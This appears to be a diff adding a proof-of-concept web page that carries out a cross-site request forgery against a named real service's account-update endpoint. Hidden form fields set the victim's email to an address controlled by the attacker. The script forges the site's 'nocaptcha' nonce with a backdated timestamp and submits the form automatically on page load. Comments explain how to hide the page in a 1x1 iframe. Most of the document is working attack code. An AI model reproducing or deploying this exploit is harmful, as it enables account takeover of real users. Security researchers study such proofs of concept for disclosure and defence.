@@ -1,1 +1,43 @@
-Hello World
+<html>
+<head>
+</head>
+<body>
+<h1>CSRF Vulnerability Demonstration Page</h1>
+<!-- The attack can be hidden from the user by being placed in a 1x1
+     iframe -->
+<!--<iframe src="http://0.0.0.0:8000/csrf2.html" width="1" height="1">-->
+<form id="update_my_account" action="https://www.splunk.com/page/update_my_account" method="POST">
+    <input id="displayName" type="hidden" class="inputBox" name="displayName" value="Attack Victim">
+    <!-- Change the value of this field to an email address controlled
+         by the attacker -->
+    <input id="email" type="hidden" class="inputBox" name="email" value="sec29229@gmail.com">
+    <input type="checkbox" name="receive_emails" checked="checked" style="display:none">
+    <input id="save_changes" type="submit" class="primary" name="action" value="Save Changes" style="display:none">
+
+    <input type="text" id="no_display" style="display:none" name="nocaptcha[nodisplay]" tabindex="999">
+    <input type="hidden" id="timestamp" name="nocaptcha[timestamp]" value="">
+    <input type="hidden" id="referer" name="nocaptcha[referer]" value="">
+    <input type="hidden" id="nonce" name="nocaptcha[nonce]" value="">
+    <input type="hidden" id="session_nonce" name="nocaptcha[session_nonce]" value="">
+</form>
+<script src="http://crypto-js.googlecode.com/svn/tags/3.1.2/build/rollups/md5.js"></script>
+<script>
+var formID = "update_my_account";
+// Set the timestamp 2 seconds in the past so it looks like we're not
+// submitting the form immediately
+var timestamp = (new Date().getTime() || Date.Now()) / 1000 - 2000;
+var referer = document.URL.replace(/https?:\/\//, "");
+var hash = CryptoJS.MD5(formID + timestamp + referer);
+var nonce = hash.toString(CryptoJS.enc.Hex);
+console.log(nonce);
+document.getElementById("timestamp").value = timestamp;
+document.getElementById("referer").value = referer;
+document.getElementById("nonce").value = nonce;
+document.getElementById("session_nonce").value = nonce;
+//window.setTimeout(function() {
+document.getElementById("update_my_account").submit();
+//    }, 2000);
+</script>
+<!--</iframe>-->
+</body>
+</head>
